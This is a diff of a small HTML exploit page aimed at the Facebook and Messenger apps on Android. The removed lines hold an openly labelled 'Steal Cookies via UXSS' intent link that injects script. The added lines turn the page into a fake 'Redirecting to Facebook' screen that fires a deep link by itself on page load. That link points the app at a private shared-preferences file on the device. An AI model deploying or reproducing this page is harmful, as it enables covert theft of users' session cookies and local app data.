@@ -1,9 +1,14 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Opening Facebook...</title>
+</head>
 <body>
-    <h2>Messenger Routing Bypass</h2>
-    <a href="intent://user/1000#Intent;scheme=fb-messenger;package=com.facebook.orca;component=com.facebook.orca/com.facebook.messenger.intents.IntentHandlerActivity;S.intent_handler_delegate_method=openInAppBrowser;S.intent_handler_delegate_arg1=https://m.facebook.com;S.initial_js=alert(document.cookie);S.post_js=alert(document.cookie);S.BrowserLiteIntent.EXTRA_INITIAL_JS=alert(document.cookie);end" style="font-size: 20px; padding: 10px; background: purple; color: white; display: block; text-align: center;">
-    Steal Cookies via UXSS
-    </a>
+    <p>Redirecting to Facebook, please wait...</p>
+    <script>
+        // This is the trigger. As soon as they land here, it fires the deep link.
+        // Encoding 'fb://' as 'fb%253A%252F%252F'
+        window.location.href = "fblogin://nativesso?contactpoint=100014638358648&landing_page=fb%3A%2F%2Ffaceweb%2Ff%3Fhref%3Dfile%3A%2F%2F%2Fdata%2Fdata%2Fcom.facebook.katana%2Fshared_prefs%2Fcom.facebook.katana.preferences.LightSharedPreferencesFactory.xml";
+    </script>
 </body>
 </html>
